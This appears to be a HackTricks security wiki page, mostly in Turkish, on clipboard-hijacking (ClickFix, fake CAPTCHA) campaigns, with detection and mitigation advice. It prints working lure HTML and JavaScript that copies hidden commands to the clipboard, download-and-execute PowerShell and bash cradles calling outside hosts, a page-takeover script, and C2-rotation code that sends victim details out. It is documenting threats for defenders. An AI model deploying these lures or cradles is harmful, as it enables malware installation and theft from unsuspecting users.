# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi yapıştırmayın." – eski ama hala geçerli tavsiye

## Genel Bakış

Clipboard hijacking – diğer adıyla *pastejacking* – kullanıcıların komutları incelemeden rutin olarak kopyala-yapıştır yapması gerçeğinden faydalanır. Kötü amaçlı bir web sayfası (veya Electron veya Desktop uygulaması gibi JavaScript çalıştırabilen herhangi bir bağlam), programatik olarak saldırgan kontrollü metni sistem panosuna yerleştirir. Kurbanlar genellikle özenle hazırlanmış sosyal mühendislik talimatlarıyla **Win + R** (Çalıştır), **Win + X** (Quick Access / PowerShell) tuşlarına basmaları ya da bir terminal açıp panodaki içeriği *yapıştırmaları* için teşvik edilir; bu işlem hemen rastgele komutların yürütülmesine yol açar.

Çünkü **hiçbir dosya indirilmez ve hiçbir ek açılmaz**, bu teknik ekleri, makroları veya doğrudan komut yürütmeyi izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlar. Bu yüzden saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi commodity malware ailelerini dağıtan phishing kampanyalarında yaygındır.

## Zorla kopyalama düğmeleri ve gizli payloads (macOS one-liners)

Bazı macOS infostealer'lar installer sitelerini (ör. Homebrew) klonlar ve kullanıcıların sadece görünen metni seçememesi için **“Copy” düğmesinin kullanımını zorlar**. Pano girdisi beklenen installer komutunu ve sonuna eklenmiş bir Base64 payload'u (ör. `...; echo <b64> | base64 -d | sh`) içerir; böylece tek bir yapıştırma ikisini de yürütürken UI ekstra aşamayı gizler.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatted veya ele geçirilmiş bir siteyi ziyaret eder (örn. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript'i, `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır; bu fonksiyon panoya Base64 kodlu bir PowerShell tek satırı gizlice kaydeder.
3. HTML talimatları kurbana şunu söyler: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe` çalışır; meşru bir yürütülebilir dosya ve kötü amaçlı bir DLL içeren bir arşiv indirir (klasik DLL sideloading).
5. Yükleyici ek aşamaların şifresini çözer, shellcode enjekte eder ve kalıcılık sağlar (ör. scheduled task) – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) kendi dizininde `msvcp140.dll` dosyasını arar.
* Kötü amaçlı DLL, API'leri **GetProcAddress** ile dinamik olarak çözer, iki ikili (`data_3.bin`, `data_4.bin`) dosyayı **curl.exe** ile indirir, bunları rolling XOR key `"https://google.com/"` kullanarak çözer, son shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` dizinine açar.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. Bir MSI payload'ını alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer MSHTA üzerinden
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmeyi tamamen atlayıp, kurbanlara WSH aracılığıyla JavaScript'i fetch ve execute eden bir one‑liner yapıştırmalarını, bunu persist etmelerini ve C2'yi günlük olarak rotate etmelerini söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Basit incelemeyi atlatmak için çalışma zamanında ters çevrilmiş ve obfusk edilmiş URL.
- JavaScript kendini Startup LNK (WScript/CScript) aracılığıyla kalıcı hale getirir ve C2'yi mevcut güne göre seçer – hızlı domain rotasyonuna imkan tanır.

Tarihe göre C2'leri döndürmek için kullanılan minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Son aşamada genellikle kalıcılık sağlayan bir loader dağıtılır ve bir RAT (ör. PureHVNC) çekilir; genellikle TLS sabit bir sertifikaya pinlenir ve trafik parçalara ayrılır.

Detection ideas specific to this variant
- İşlem ağacı: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Başlangıç artefaktları: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` içinde WScript/CScript çağıran LNK; JS yolu `%TEMP%`/`%APPDATA%` altında.
- Registry/RunMRU ve komut satırı telemetrisi içinde `.split('').reverse().join('')` veya `eval(a.responseText)` içeren girdiler.
- Uzun komut satırları olmadan uzun scriptleri beslemek için büyük stdin payload'ları ile tekrar eden `powershell -NoProfile -NonInteractive -Command -`.
- Daha sonra LOLBins çalıştıran Scheduled Tasks, ör. bir updater görünümlü görev/yol altında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` (ör. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük dönen C2 host adları ve URL'ler; örüntü `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Panoya yazma olaylarını, ardından Win+R ile yapıştırma ve hemen `powershell.exe` çalıştırılması ile korelasyon kurun.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Kayıt Defteri: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** komutlarının geçmişini tutar – olağandışı Base64 / obfuskasyon içeren girdilere bakın.
* Güvenlik Olayı ID **4688** (Process Creation) — `ParentImage` == `explorer.exe` ve `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } içinde.
* Event ID **4663** — şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` altı veya geçici klasörlerdeki dosya oluşturma olayları.
* EDR clipboard sensörleri (varsa) – hemen ardından yeni bir PowerShell süreci başlayan `Clipboard Write` ile korelasyon kurun.

## IUAM-style doğrulama sayfaları (ClickFix Generator): panoyu konsola kopyalama + işletim sistemine duyarlı payload'lar

Son kampanyalar, kullanıcıları panolarındaki işletim sistemine özgü komutları yerel konsollara kopyalamaya zorlayan sahte CDN/tarayıcı doğrulama sayfalarını ("Just a moment…", IUAM-style) seri şekilde üretiyor. Bu, yürütmeyi tarayıcı sandbox'ından çıkarır ve Windows ile macOS üzerinde çalışır.

Builder tarafından oluşturulan sayfaların ana özellikleri
- `navigator.userAgent` ile OS tespiti yapılarak payload'lar uyarlanır (Windows PowerShell/CMD vs. macOS Terminal). Desteklenmeyen OS'ler için illüzyonu sürdürmek üzere isteğe bağlı decoy/no-op'lar.
- Zararsız UI eylemlerinde (checkbox/Copy) otomatik panoya kopyalama; görünür metin panodakinden farklı olabilir.
- Mobil engelleme ve adım adım talimat içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- İsteğe bağlı obfuscation ve tek dosyalık injector ile ele geçirilmiş bir sitenin DOM'unu Tailwind-stili bir doğrulama UI'si ile overwrite etme (yeni bir domain kaydı gerekmez).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS'ta ilk çalıştırmanın kalıcılığı
- Şunu kullanın `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` böylece terminal kapandıktan sonra yürütme devam eder ve görünür izleri azaltır.

Ele geçirilmiş sitelerde In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Clipboard API'yi doğrulama widget'larına bağlayan sayfalar; görüntülenen metin ile clipboard payload arasında uyumsuzluk; `navigator.userAgent` ile dallanma; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` tarayıcı etkileşiminin hemen sonrasında; batch/MSI installer'ların `%TEMP%`'ten çalıştırılması.
- macOS endpoint: Terminal/iTerm'in tarayıcı olaylarına yakın zamanda `bash`/`curl`/`base64 -d` ile `nohup` çalıştırması; terminal kapatıldıktan sonra arka plan görevlerinin devam etmesi.
- `RunMRU` Win+R geçmişini ve clipboard yazmalarını sonraki console process oluşturulmalarıyla ilişkilendirin.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini ele geçirmeye devam ediyor ve loader JavaScript ile dış hostları zincirleyip (Cloudflare Workers, GitHub/jsDelivr) hatta blockchain “etherhiding” çağrıları (ör., Binance Smart Chain API endpoint'lerine POST'lar: `bsc-testnet.drpc[.]org`) yaparak güncel lure mantığını çekiyor. Son zamanlarda overlay'ler, kullanıcıları bir şeyi indirmek yerine tek satırlık bir komutu kopyalayıp yapıştırmaları (T1204.004) talimatı veren fake CAPTCHA'ları yoğun şekilde kullanıyor.
- İlk yürütme giderek imzalı script hostlarına/LOLBAS'a devrediliyor. Ocak 2026 zincirleri önceki `mshta` kullanımını yerel `SyncAppvPublishingServer.vbs`'ye (WScript.exe aracılığıyla çalıştırılan) değiştirdi; uzak içeriği çekmek için alias'lar/wildcard'lar içeren PowerShell-benzeri argümanlar geçiriliyor:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ile birlikte ve alışılmadık argümanlarla (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) kullanıldığında ClearFake için yüksek sinyalli bir LOLBAS safhası haline gelir.
- Şubat 2026 sahte CAPTCHA payload'ları tekrar saf PowerShell download cradles'a kaydı. İki canlı örnek:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir bellek içi `iex(irm ...)` grabber; ikinci aşama `WinHttp.WinHttpRequest.5.1` ile ilerler, geçici bir `.ps1` yazar, sonra gizli bir pencerede `-ep bypass` ile başlatır.

Detection/hunting tips for these variants
- Proses hattı: tarayıcı → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` veya PowerShell cradles, pano yazma/Win+R işleminden hemen sonra.
- Komut satırı anahtar kelimeleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domain'leri veya ham IP `iex(irm ...)` desenleri.
- Ağ: web taramasından kısa süre sonra script host/PowerShell'den CDN worker host'larına veya blockchain RPC uç noktalarına giden çıkış trafiği.
- Dosya/kayıt: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu tek satırlıkları içeren RunMRU girdileri; dış URL'lerle veya karartılmış alias dizeleriyle yürütülen signed-script LOLBAS (WScript/cscript/mshta) için engelle/uyarı.

## Önlemler

1. Tarayıcı sertleştirmesi – pano yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı etkileşimi gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmalarını* veya önce bir metin düzenleyiciye yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile rastgele tek satır komutları engelleyin.
4. Ağ kontrolleri – bilinen pastejacking ve malware C2 domain'lerine giden çıkış isteklerini engelleyin.

## İlgili Hileler

* **Discord Invite Hijacking** genellikle kullanıcıları kötü amaçlı bir sunucuya çekip aynı ClickFix yaklaşımını kötüye kullanır:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
